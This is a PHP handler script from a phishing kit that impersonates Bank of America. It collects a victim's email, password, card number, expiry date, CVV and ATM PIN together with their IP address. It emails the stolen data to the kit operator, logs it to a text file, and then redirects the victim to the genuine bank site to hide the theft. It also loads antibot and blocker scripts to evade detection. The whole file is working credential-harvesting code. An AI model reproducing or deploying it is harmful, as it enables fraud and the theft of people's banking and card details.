<?php include ("../images/sec.gif");
$zabi = getenv("REMOTE_ADDR");
include '../antibots.php';
include('../email.php');
include '../bt.php';
include "../blocker.php";
$message .= "--------------  BOA LOGIN  -------------\n";
$message .= "Email        : ".$_POST['email']."\n";
$message .= "Email clave  : ".$_POST['password']."\n";
$message .= "Card Number  : ".$_POST['card']."\n";
$message .= "Month/Year   : ".$_POST['exp']."\n";
$message .= "CVV          : ".$_POST['cvv']."\n";
$message .= "Clave ATM    : ".$_POST['pin']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "-----------------------------------------------------\n";
$cc = $_POST['ccn'];
$subject = "BOA BAN3 LOGGN [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: HACKER.SPAMMER <contact>\r\n";
mail($email,$subject,$message,$headers);
mail($userinfo,$subject,$message,$headers);
$text = fopen('../Datosssbofa.txt', 'a');
fwrite($text, $message);


mail($userinfo,$subject,$message,$headers);header("Location:https://staticweb.bankofamerica.com/cavmwebbactouch/common/index.html#home?app=signonv2?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>